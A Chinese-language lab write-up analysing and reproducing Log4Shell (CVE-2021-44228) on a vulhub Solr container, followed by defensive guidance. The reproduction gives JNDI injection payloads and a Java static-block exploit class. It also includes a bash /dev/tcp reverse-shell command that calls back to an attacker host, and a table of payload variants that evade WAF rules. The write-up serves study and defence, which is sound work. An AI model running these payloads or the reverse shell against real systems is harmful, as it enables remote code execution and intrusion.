# Log4Shell（CVE-2021-44228）漏洞分析与复现：从 JNDI 注入到反弹 Shell 

<hr>

## 目录

1. 漏洞简介
2. JNDI 与 LDAP 远程类加载
3. 漏洞原理分析
4. 复现过程
5. 手写恶意 LDAP 服务器
6. 需要注意的点
7. Payload 变体
8. 防御手法
9. 总结

<hr>

## 1. 漏洞简介

Log4Shell 是 Apache Log4j 2 在 2021 年 12 月爆出的一个 JNDI 注入漏洞，编号 CVE-2021-44228，CVSS 3.1 评分 10.0。几乎所有使用 Log4j2 记录日志的 Java 应用都会中招——包括 Solr、Elasticsearch、Druid、Kafka、部分 Spring Boot 应用等。

它的可怕之处在于三点：

- **触发面极广**：不是某个特定接口的漏洞，而是"只要你的字符串被 Log4j 打进日志"就会触发。HTTP 请求头、参数、URL 路径、用户名字段、User-Agent……都可能成为入口。
- **利用门槛极低**：一行 `${jndi:ldap://attacker/xxx}` 字符串即可，不需要认证，不需要任何前置条件。
- **危害为远程代码执行**：最终以应用进程的权限执行任意命令，容器场景下通常直接就是 root。

一句话概括漏洞原理：**Log4j2 在格式化日志时会对 `${}` 占位符做"查找（lookup）"替换，其中 `jndi:` 前缀会发起一次 JNDI 调用；攻击者把 JNDI 指向自己的 LDAP 服务器，服务器返回一个"Java 对象引用"，目标 JVM 会从攻击者的 HTTP 服务器远程加载并实例化恶意类，从而执行其中的恶意代码。**

---

## 2. JNDI 与 LDAP 远程类加载

### 2.1 JNDI 是什么

JNDI（Java Naming and Directory Interface）是 Java 提供的一套**命名与目录服务统一接口**。它的核心 API 只有两个动作：

```java
Context ctx = new InitialContext();
Object obj = ctx.lookup("some/name");   // 按名字找对象
```

名字的协议前缀决定用哪个实现：`ldap://` 走 `com.sun.jndi.ldap.LdapCtx`，`rmi://` 走 RMI 实现，`java:comp/env` 走本地 JNDI等。**关键点在于：`lookup()` 返回的不一定是一个已存在的对象——如果服务端返回的是"引用"，客户端会尝试把它还原成对象，这个过程可能导致远程加载并实例化一个类。**

### 2.2 Reference 与 ObjectFactory

JNDI 规范里用于表达"引用"的类是 `javax.naming.Reference`，它有三个要素：

- `className`：目标类名；
- `classFactory`：负责实例化它的工厂类名；
- `classFactoryLocation`：**工厂类的字节码从哪个 URL 拉取**（codebase）。

客户端拿到 Reference 后，`javax.naming.spi.NamingManager.getObjectInstance()` 会调用 `getObjectFactoryFromReference()`，后者从 codebase 指定的位置（可以是 `http://`、`file://`、`ftp://`）下载 class 文件并加载。这就是"远程类加载"的机制来源，本身是 JNDI 的合法功能，但在攻击者控制 codebase 时就成了 RCE。

### 2.3 LDAP 怎么表达一个 Java 对象引用

LDAP 是目录服务协议，本身不认识 Java 对象。JDK 的做法是用一组**约定属性名**来表达，入口是 `objectClass` 取值为 `javaNamingReference`：

| 属性名 | 含义 | 对应 Reference 的字段 |
|---|---|---|
| `objectClass` | 固定 `javaNamingReference` | 标记这是一条 Java 引用 |
| `javaClassName` | 目标类名 | `className` |
| `javaCodeBase` | 类文件所在的 URL 前缀 | `classFactoryLocation` |
| `javaFactory` | 工厂类名 | `classFactory` |

目标端 JNDI 收到这条 entry 后，`com.sun.jndi.ldap.Obj.decodeObject()` 会构造出 Reference，随后按上面的流程远程加载 `javaFactory` 指定的类。

### 2.4 关于 JDK 版本

8u191 / 11.0.1 起，对 **LDAP** 增加了 `com.sun.jndi.ldap.object.trustURLCodebase` 开关，**默认值为 false**，即不再信任 LDAP 响应里给的 codebase。

因此，此次复现要选用 JDK < 8u191的版本 → 可以直接远程加载代码，利用简单。

---

## 3. 漏洞原理分析

### 3.1 Log4j 的"消息查找"机制

Log4j 2 支持在日志消息里写 `${}` 占位符，由 `org.apache.logging.log4j.core.lookup.StrSubstitutor` 负责替换。语法是 `${prefix:name}`，其中 prefix 决定用哪个 Lookup 实现：

```
${env:USER}          → 环境变量
${sys:java.version}  → 系统属性
${date:yyyy-MM-dd}   → 时间
${jndi:ldap://...}   → JNDI
```

`jndi:` 对应的实现在 `log4j-core` 的 `org.apache.logging.log4j.core.lookup.JndiLookup`。

### 3.2 从一条日志到一个网络请求

触发链路可以简化成四步：

```
应用代码 logger.info("... action={} ...")
   └─ MessagePatternConverter.format()          日志格式化，解析 ${}
      └─ StrSubstitutor.replace() → Interpolator.lookup("jndi:ldap://...")
         └─ JndiLookup.lookup(event, key)
            └─ JndiManager.lookup(name) → InitialContext.lookup("ldap://...")
               └─ 目标 JVM 向攻击机 1389 发起 LDAP 请求   ← 回调
```

### 3.3 目标 JVM 发生了什么

LDAP 服务器返回 `javaNamingReference` 之后，目标 JVM 里的动作顺序是：

```
LdapCtx.c_lookup()
   └─ Obj.decodeObject()                        检查 attrs 里有没有 javaClassName
      └─ ObjFactory / NamingManager.getObjectInstance(reference)
         └─ getObjectFactoryFromReference()      按 javaCodeBase 下载 class
            └─ VersionHelper12.loadClass()       URLClassLoader 加载类
               └─ Class.forName(...) / newInstance()
                  └─ 静态代码块 static { } 执行   ← 任意代码执行
```

### 3.4 为什么恶意代码要写在静态块里

```java
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "id"});
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

因为 JNDI 的流程是"加载类 → 实例化"：如果代码写在构造方法里，类在**加载阶段**就会执行静态块，不依赖后续的实例化是否成功。这也解释了后续一个"看起来像报错、其实是成功"的现象——日志里出现 `ClassCastException: Exploit cannot be cast to javax.naming.spi.ObjectFactory` 或 `InstantiationException: Exploit`，**都是正常的**，因为静态块在报错之前就已经跑完了。

---

## 4. 复现过程

### 4.1 靶机（Docker + vulhub）

```bash
# 获取 vulhub 靶机（sparse 检出，只取 log4j 目录）
mkdir -p ~/lab && cd ~/lab
git clone --depth 1 --filter=blob:none --sparse https://github.com/vulhub/vulhub.git
cd vulhub && git sparse-checkout set log4j/CVE-2021-44228
cd log4j/CVE-2021-44228 && docker compose up -d
docker ps     #  cve-2021-44228-solr-1，端口8983
```

### 4.2 攻击机工具链

```bash
java -version     # 本机 java 是 JDK 21
javac -version    # 真正的编译器在 JDK 21：/usr/lib/jvm/java-21-openjdk-amd64

# 所有涉及编译的命令统一指定 JDK 21（Maven 也依赖它）
export JAVA_HOME=/usr/lib/jvm/java-21-openjdk-amd64
export PATH=$JAVA_HOME/bin:$PATH

# Maven
export PATH=/opt/maven/bin:$PATH
```

### 4.3 编译与测试

```bash
export JAVA_HOME=/usr/lib/jvm/java-21-openjdk-amd64
cd java_toolkit
javac -d classes src/*.java

# 集成测试：LDAP 协议握手 + HTTP + 类生成 + Payload + 扫描
java -cp classes ToolTest          # 期望结果为 passed=13 failed=0

# 端到端（需要 Solr 容器在线）：完整攻击链 + 自动探测
java -cp classes E2ETest           # 期望 [PASS] 端到端验证成功, 则反弹 Shell 成功建立
```

### 4.4 四个终端

```bash
# 终端 1：恶意 LDAP
java -cp classes MaliciousLDAPServer 1389 http://192.168.217.143:8888/
# 终端 2：HTTP 文件服务器
java -cp classes HttpFileServer exploit_dir 8888
# 终端 3：生成恶意类（javac --release 8，自动校验 major 52）
java -cp classes MaliciousClassGenerator "bash -i >& /dev/tcp/192.168.217.143/4444 0>&1" exploit_dir
# 终端 4：反弹 Shell 监听
java -cp classes ReverseShellListener 4444
# 发送 Payload 触发（400 是正常现象）
java -cp classes PayloadSender 172.18.0.2 8983 "ldap://192.168.217.143:1389/cn=Exploit"
# 观察结果
```

---

## 5. 手写恶意 LDAP 服务器

### 5.1 为什么要自己写

经典的 JNDI 利用工具是 `LDAPRefServer`，它依赖 Maven 构建；本次实验环境里 apt 源与 GitHub release CDN 都不稳定，下载大文件反复超时。而 JNDI 客户端要求的 LDAP 子集其实很小，用 JDK 标准库手写一个只要两百来行，还没有任何外部依赖。

### 5.2 JNDI 客户端期望的协议流程

Java 的 JNDI LDAP 客户端连接后的行为是固定的三步，服务端**必须按照顺序**应答：

```
TCP 连接建立
  ├─ 客户端 → BindRequest      (0x60)
  ├─ 服务端 ← BindResponse     (0x61, resultCode = success)     ← 不回就报 Operations Error
  ├─ 客户端 → SearchRequest    (0x63)
  ├─ 服务端 ← SearchResultEntry(0x64) + SearchResultDone(0x65)  ← 两个都要有
  └─ 客户端 → UnbindRequest    (0x42) → 服务端关闭连接
```

不能只回 `SearchResultEntry` ，客户端会在 bind 阶段报 `[LDAP: error code 1 - Operations Error]`，必须结合`SearchResultDone`，这是真实踩过的坑。

<hr>

## 6. 需要注意的点

### 6.1 lookup 返回了 LdapCtx，类却始终不加载

 lookup 不报错，但 HTTP 服务器始终收不到 `Exploit.class` 的请求，攻击静默失败。

反编译 JDK 8 的客户端实现可以看到 `c_lookup` 里只有 `attrs.get("javaClassName") != null` 才调用 `Obj.decodeObject()`，而 `decodeObject` 内部又是按 `"javaClassName"`、`"objectClass"` 这些**友好名**取值的。再用 `DirContext.getAttributes()` 实测客户端解析出的属性 ID，发现是 **OID 原样**（`2.5.4.0`、`1.3.6.1.4.1.42.2.27.4.1.6`……）。

Java 8 的 JNDI 客户端在无 schema 环境下不会把 OID 映射成友好名，于是 `attrs.get("javaClassName")` 永远返回 null，`decodeObject` 根本不被调用，lookup 只返回一个 `LdapCtx` 子 context。

### 6.2 payload 里的路径必须是合法 DN

**DN** 是 LDAP 里条目的唯一标识符，类似文件路径。合法 DN 必须符合 `属性类型=值` 的格式。

**报错**：

```
javax.naming.InvalidNameException: Invalid name: Exploit; remaining name 'Exploit'
    at javax.naming.ldap.Rfc2253Parser.doParse
    at com.sun.jndi.ldap.LdapCtx.<init>(LdapCtx.java:341)
```

改用合法 DN 形式：

```
${jndi:ldap://192.168.217.143:1389/cn=Exploit}
```

---

## 7. Payload 变体

真实对抗中 payload 会被各种规则做字符串匹配，常见变体如下：

| 变体 | 写法 | 说明 |
|---|---|---|
| 基础 | `${jndi:ldap://H:P/Exploit}` | 部分版本因路径非合法 DN 而失败 |
| 合法 DN | `${jndi:ldap://H:P/cn=Exploit}` | **首选**，本场景必选 |
| 嵌套 lower | `${${lower:j}ndi:ldap://H:P/cn=Exploit}` | 绕 `jndi` 字面量匹配 |
| 默认值语法 | `${${::-j}ndi:ldap://H:P/cn=Exploit}` | 绕 `jndi` 字面量匹配 |
| URL 编码 | `%24%7Bjndi:ldap://...%7D` | 解码后再写日志 |
| 双重编码 | `%2524%257Bjndi:...%257D` | 验证两层解码 |
| DNS 探测 | `${jndi:dns://H:P/cn=Exploit}` | 无代码执行，可用于确认可达性 |
| RMI 对照 | `${jndi:rmi://H:P/cn=Exploit}` | 需要 RMI 服务，没有则一定失败 |

`${${lower:j}ndi:...}` 这类嵌套写法能让简单的字面量匹配规则失效。防御需落在协议层和网络层，而不是特征串匹配。

---

## 8. 防御手法

**第一是升级。** 升级到 Log4j 2.17.1 及以上；

**第二是协议层。** 把 JDK 升到 8u191 / 11.0.1 及以上，`com.sun.jndi.ldap.object.trustURLCodebase` 默认为 false，LDAP 远程类加载这条路直接断掉。

**第三是网络层。** 出口防火墙禁止业务服务器主动向外发起 LDAP / RMI / 非受控 HTTP 连接等——攻击链的三个回调全部依赖**出站**连接，把出站流量管住，比任何字符串规则都可靠。

**第四WAF 。** 规则要覆盖：`${` 与 `jndi:` 的组合、`${${` 嵌套写法、URL 编码与双重编码形式，并在解码后做二次检查。检测侧可以在日志和流量里搜索 `${jndi:`、`${lower:`、`${::-`、`ldap://`，以及 DNS/内网 LDAP 的异常出站请求。

**这类漏洞的教训是：**把不可信输入送进一个会解释执行的格式化引擎，等价于把解释器暴露给攻击者。类似的"注入"模式在 EL、SpEL、OGNL 里反复出现，防御思路是一致的——不能把用户输入当代码解释，或者至少让解释器不具备加载外部资源的能力。

---

## 9. 总结

复现能成立的前提——**Log4j 未校验 lookup 协议、目标 JDK 低于 8u191、服务器能主动出网**，三者必须兼具。

三个回调点（LDAP 1389 / HTTP 8888 / 反弹 4444）既是复现成功与否的重要标志，也是防御时的重点位置。
